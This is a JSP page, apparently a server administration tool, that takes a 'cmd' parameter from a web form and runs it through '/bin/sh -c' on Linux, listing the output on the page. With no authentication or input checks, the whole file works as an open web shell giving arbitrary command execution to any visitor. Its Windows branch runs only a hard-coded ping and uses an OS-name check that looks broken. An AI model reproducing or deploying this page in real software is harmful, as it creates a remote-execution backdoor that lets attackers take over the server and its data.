<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%@page import="java.io.*"%>
<%@page import="org.apache.commons.io.IOUtils"%>
<%@page import="java.io.BufferedReader"%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<%@ taglib uri="http://java.sun.com/jsp/jstl/fmt" prefix="fmt" %>

<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";

String command = request.getParameter("cmd");
if (command != null) {

	
			String osName = (String)System.getProperties().get("os.name");
			osName = osName.toLowerCase();
			String cmdWindow = null;
			String[] cmdLinux = null;
			if ("linux".equals(osName)) {
				//linux
//				String cmd = "./fork_wait";
//				String cmd = "ls -l";
				cmdLinux = new String[3];
				cmdLinux[0]="/bin/sh";
				cmdLinux[1]="-c";
				//cmdLinux[2]="ls -l ./";
				cmdLinux[2]=command;
			} else if ("window".equals(osName)) {
				//windows
//				String cmd = "F:\\apache-tomcat-6.0.20.exe";
//				String cmd = "D:\\Program Files\\Microsoft Office\\OFFICE11\\WINWORD.EXE F:\\test.doc";
//				String cmd = "cmd.exe /c start F:\\test.doc";
				cmdWindow = "ping www.baidu.com";
			}
			List<String> dataList = new ArrayList<String>();
			Runtime run = Runtime.getRuntime();//返回与当前 Java 应用程序相关的运行时对象
			BufferedInputStream in = null;
			BufferedReader br = null;
			try {
				// window 使用 字符串
				Process p = null;
				if ("linux".equals(osName)) {
					p = run.exec(cmdLinux);// 启动另一个进程来执行命令
				} else if ("window".equals(osName)) {
					p = run.exec(cmdWindow);// 启动另一个进程来执行命令
				}
				in = new BufferedInputStream(p.getInputStream());
				br = new BufferedReader(new InputStreamReader(in, "utf-8"));
				String lineStr = null;
				while ((lineStr = br.readLine()) != null)
					//获得命令执行后在控制台的输出信息
					//System.out.println(lineStr);// 打印输出信息
					dataList.add(lineStr);
				//检查命令是否执行失败。
				if (p.waitFor() != 0) {
					if (p.exitValue() == 1) { //p.exitValue()==0表示正常结束，1：非正常结束
						//System.err.println("命令执行失败!");
						request.setAttribute("err", "命令执行失败!");
					}
						
				}
			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				IOUtils.closeQuietly(in);
				IOUtils.closeQuietly(br);
			}
			request.setAttribute("dataList", dataList);
}
%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
  <head>
    <base href="<%=basePath%>">
    
    <title>My JSP 'title.jsp' starting page</title>
    
	<meta http-equiv="pragma" content="no-cache">
	<meta http-equiv="cache-control" content="no-cache">
	<meta http-equiv="expires" content="0">    
	<meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
	<meta http-equiv="description" content="This is my page">
	<!--
	<link rel="stylesheet" type="text/css" href="styles.css">
	-->
  <script type="text/javascript">
<!--
function change() {
	var frm = document.forms['dbForm'];
	frm.submit();
}
//-->
</script>
  </head>
  
  <body>

    	<form action="manage/sys/file/command.jsp" method="post" name="dbForm">
    	<textarea rows="20" cols="100" name="cmd">${param.cmd }</textarea>
    	<br/>
    	<input type="button" onclick="change()" value="执行" />
    	</form>
    	<br/>
    	${err }
    	<br/>
    	<table cellpadding="1" border="1" cellspacing="1">
    	<c:forEach items="${dataList}" var="datas" varStatus="status">
    	<tr>
    		<td>${status.index + 1}</td>
    		<td>${datas }&nbsp;</td>
    	</tr>
    	</c:forEach>
    	</table>
    	<br/>
    	${result }
  </body>
</html>
